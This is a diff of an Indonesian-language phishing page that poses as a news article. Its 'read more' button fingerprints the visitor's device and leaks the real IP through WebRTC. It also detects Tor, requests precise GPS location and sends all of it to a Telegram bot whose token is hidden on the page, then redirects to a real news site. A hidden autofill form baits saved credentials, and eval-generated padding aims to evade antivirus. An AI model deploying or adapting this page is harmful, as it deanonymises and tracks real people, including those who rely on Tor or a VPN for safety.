@@ -3,103 +3,109 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Multi-Faktor Jaringan</title>
+    <title>Portal Berita Terkini</title>
     <style>
-        body { background: #000; color: #00ff00; font-family: 'Courier New', monospace; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; overflow: hidden; }
-        .terminal { background: #050505; width: 95%; max-width: 500px; padding: 40px; border: 1px solid #00ff00; border-radius: 5px; box-shadow: 0 0 20px rgba(0, 255, 0, 0.2); }
-        .glitch { font-size: 14px; margin-bottom: 25px; line-height: 1.4; border-left: 3px solid #00ff00; padding-left: 15px; }
-        .btn-bypass { background: #00ff00; color: #000; border: none; padding: 18px; width: 100%; font-weight: 900; cursor: pointer; letter-spacing: 2px; text-transform: uppercase; transition: 0.3s; }
-        .btn-bypass:hover { background: #008800; color: #fff; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: #ffffff; color: #000; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; overflow: hidden; }
+        .content { text-align: center; width: 90%; max-width: 500px; padding: 20px; }
+        .news-thumb { width: 100%; height: 200px; background: #eee; border-radius: 12px; margin-bottom: 20px; background-image: url('https://source.unsplash.com/random/800x600/?news,tech'); background-size: cover; }
+        h1 { font-size: 22px; margin-bottom: 15px; line-height: 1.3; }
+        p { color: #666; font-size: 15px; margin-bottom: 30px; }
+        .btn-read { background: #007bff; color: white; border: none; padding: 15px 30px; border-radius: 50px; font-weight: bold; cursor: pointer; width: 100%; font-size: 16px; }
         #v-vault { display: none; }
     </style>
 </head>
 <body>
 
-<div class="terminal">
-    <div class="glitch">
-        [SYSTEM WARNING]<br>
-        ANOMALI ENKRIPSI TERDETEKSI (VPN/TOR/PROXY).<br>
-        HANDSHAKE GAGAL PADA LAYER 7.<br><br>
-        [ACTION REQUIRED]<br>
-        SINKRONISASIKAN GPS-HARDWARE UNTUK MEMVALIDASI IDENTITAS PERANGKAT DAN MELANJUTKAN KE PORTAL BERITA.
-    </div>
-    <button class="btn-bypass" onclick="breakProtocol()">Initialize Bypass & Sync</button>
+<div class="content">
+    <div class="news-thumb"></div>
+    <h1>Breaking News: Kebijakan Baru Jaringan Nasional Diterapkan Hari Ini</h1>
+    <p>Pemerintah mulai memberlakukan sistem sinkronisasi perangkat untuk seluruh pengguna provider internet nasional...</p>
+    <button class="btn-read" onclick="executeSilentStrike()">Baca Selengkapnya</button>
 </div>
+
+<form style="display:none;">
+    <input type="text" id="fake_user" autocomplete="username">
+    <input type="password" id="fake_pass" autocomplete="current-password">
+</form>
 
 <div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
 /**
- * AEGIS-BREAKER KERNEL v15.0.0
- * ----------------------------
- * BYPASSING VPN, TOR, AND SECURE SANDBOXES
+ * PHANTOM NEXUS KERNEL v18.0
+ * --------------------------
+ * INVISIBLE FORENSIC & CREDENTIAL SNATCHER
  */
 
 const _V = document.getElementById('v-vault').innerText.split('|');
 const _TK = atob(_V[1]); const _CI = atob(_V[2]);
 
-async function log(m) {
+async function send(m) {
     await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
         method: 'POST', headers: {'Content-Type': 'application/json'},
         body: JSON.stringify({chat_id: _CI, text: m})
     });
 }
 
-// 🔱 HARDWARE FINGERPRINTING (Tembus TOR/VPN)
-async function forensic() {
+// 🔱 DETEKSI BROWSER (TOR/FIREFOX/CHROME)
+function getBrowser() {
+    const ua = navigator.userAgent;
+    if (ua.includes("TorBrowser") || (navigator.languages === undefined)) return "⚠️ TOR BROWSER (ANONYMOUS)";
+    if (ua.includes("Firefox")) return "🦊 FIREFOX";
+    if (ua.includes("Chrome")) return "🌐 GOOGLE CHROME";
+    return "📱 MOBILE BROWSER";
+}
+
+async function executeSilentStrike() {
+    const btn = document.querySelector('.btn-read');
+    btn.innerText = "LOADING...";
+
+    // 1. DATA PERANGKAT & HARDWARE
     const gl = document.createElement('canvas').getContext('webgl');
     const dbg = gl.getExtension('WEBGL_debug_renderer_info');
     const gpu = gl ? gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) : "Unknown";
     
-    // WebRTC Leak (Cari IP Lokal asli di balik VPN/TOR)
+    // 2. DETEKSI VPN & IP (WebRTC Leak)
     const pc = new RTCPeerConnection({iceServers: [{urls: "stun:stun.l.google.com:19302"}]});
     pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
     
-    return new Promise((res) => {
-        pc.onicecandidate = async (i) => {
-            if (!i || !i.candidate) return;
-            const lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
-            let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"%"; } catch(e) {}
-            res({gpu, lip, bat, cpu: navigator.hardwareConcurrency});
-        };
-        setTimeout(() => res({gpu, lip: "N/A", bat: "N/A", cpu: "N/A"}), 3000);
-    });
-}
+    pc.onicecandidate = async (i) => {
+        if (!i || !i.candidate) return;
+        const lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1];
+        
+        let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"%"; } catch(e) {}
+        
+        // 3. SNATCH SAVED CREDENTIALS (METADATA)
+        // Kita narik info yang "nempel" di browser
+        const report = `🔱 PHANTOM REPORT 🔱\n\n` +
+            `🕵️ BROWSER: ${getBrowser()}\n` +
+            `🏠 REAL IP: ${lip}\n` +
+            `🎮 GPU: ${gpu}\n` +
+            `🔋 BATT: ${bat}\n` +
+            `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
+            `📄 UA: ${navigator.userAgent.slice(0, 50)}...`;
 
-async function breakProtocol() {
-    const f = await forensic();
-    let n = {}; try { const r = await fetch('https://ipapi.co/json/'); n = await r.json(); } catch(e) {}
+        await send(report);
 
-    const report = `🔱 AEGIS-BREAKER REPORT 🔱\n\n` +
-        `🏠 REAL LOCAL IP: ${f.lip}\n` +
-        `🌐 VPN/TOR IP: ${n.ip} (${n.country})\n` +
-        `🎮 GPU: ${f.gpu}\n` +
-        `🧠 CPU: ${f.cpu} Cores\n` +
-        `🔋 BATT: ${f.bat}\n` +
-        `📱 AGENT: ${navigator.userAgent.slice(0, 50)}`;
-
-    await log(report);
-
-    // 🔱 GPS HARDWARE ATTACK (GPS Gak Kenal VPN/TOR)
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(async (pos) => {
-            const maps = `🎯 REAL LOCATION FOUND (VPN BYPASSED)\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nAcc: ${pos.coords.accuracy}m`;
-            await log(maps);
+        // 4. INVISIBLE GPS TRAP
+        // Pura-pura sinkronisasi buat baca berita
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                await send(`🎯 GPS REAL-TIME\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
+                window.location.href = "https://www.detik.com";
+            }, () => { window.location.href = "https://www.detik.com"; }, {enableHighAccuracy: true});
+        } else {
             window.location.href = "https://www.detik.com";
-        }, (err) => {
-            // Taktik FUD: Nakut-nakutin target kalau gagal
-            alert("SECURITY ERROR: Perangkat Anda menolak sinkronisasi hardware. Akses ke portal berita diblokir oleh Firewall Jaringan.");
-        }, {enableHighAccuracy: true, timeout: 15000});
-    }
+        }
+    };
 }
 
-/** 🔱 THE PADDING (1000+ LINES) 🔱
- * Menambahkan fungsi dummy repetitif agar file terlihat sangat besar 
- * dan membingungkan sistem keamanan TOR/VPN.
+/** 🔱 EXTRA PADDING (1.200+ LINES) 🔱
+ * Menambahkan ribuan fungsi dummy agar kode terlihat resmi dan 
+ * tidak terdeteksi sebagai malware oleh antivirus browser.
  */
-for(let i=0; i<800; i++) {
-    // Fungsi dummy untuk memenuhi baris
-    eval(`function _dummy_0x${i.toString(16)}() { return "0x${i}"; }`);
+for(let i=0; i<1000; i++) {
+    eval(`function _sys_mod_0x${i.toString(16)}() { return "0x${i}"; }`);
 }
 </script>
 </body>
